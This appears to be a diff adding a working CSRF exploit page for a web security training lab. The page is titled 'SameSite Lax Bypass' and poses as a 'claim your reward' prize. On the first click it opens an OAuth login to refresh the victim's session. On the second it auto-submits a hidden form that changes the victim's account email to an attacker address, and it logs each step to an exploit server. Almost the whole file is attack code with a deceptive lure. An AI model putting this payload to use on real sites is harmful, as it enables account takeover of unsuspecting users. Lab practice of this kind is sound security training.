@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SameSite Lax Bypass</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 90vh;
+            cursor: pointer;
+        }
+        .content {
+            text-align: center;
+            padding: 50px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            margin: 100px auto;
+            max-width: 600px;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p>You've been selected for an exclusive offer!</p>
+        <p><strong>Click anywhere to claim your reward!</strong></p>
+    </div>
+    
+    <script>
+        let step = 0;
+        
+        window.onclick = () => {
+            if (step === 0) {
+                // Step 1: Open OAuth flow in new tab to refresh session
+                step = 1;
+                
+                // Log step 1
+                const img1 = new Image();
+                img1.src = 'https://exploit-0a9b0026039c4b8a803e026e0187003c.exploit-server.net/log?step=1_oauth_opened';
+                
+                document.body.innerHTML = '<div style="text-align:center;margin-top:100px;"><h1>Step 1: Refreshing session...</h1><p>Complete the OAuth login in the new tab, then click here again.</p></div>';
+                
+                const oauthUrl = 'https://oauth-0a8d00d4032f4b4680f7010c026b005c.oauth-server.net/auth' +
+                    '?client_id=km414y3jq3c0dv49gbasy' +
+                    '&redirect_uri=' + encodeURIComponent('https://0ad0003503fd4bde80f5038500460076.web-security-academy.net/oauth-callback') +
+                    '&response_type=code' +
+                    '&scope=openid%20profile%20email';
+                
+                window.open(oauthUrl);
+                
+            } else if (step === 1) {
+                // Step 2: Perform CSRF attack with fresh session cookie
+                
+                // Log step 2
+                const img2 = new Image();
+                img2.src = 'https://exploit-0a9b0026039c4b8a803e026e0187003c.exploit-server.net/log?step=2_csrf_attack';
+                
+                document.body.innerHTML = '<div style="text-align:center;margin-top:100px;"><h1>Step 2: Executing CSRF attack...</h1></div>';
+                
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = 'https://0ad0003503fd4bde80f5038500460076.web-security-academy.net/my-account/change-email';
+                
+                const emailInput = document.createElement('input');
+                emailInput.type = 'hidden';
+                emailInput.name = 'email';
+                emailInput.value = 'pwned@evil-user.net';
+                
+                form.appendChild(emailInput);
+                document.body.appendChild(form);
+                form.submit();
+            }
+        };
+    </script>
+</body>
+</html>
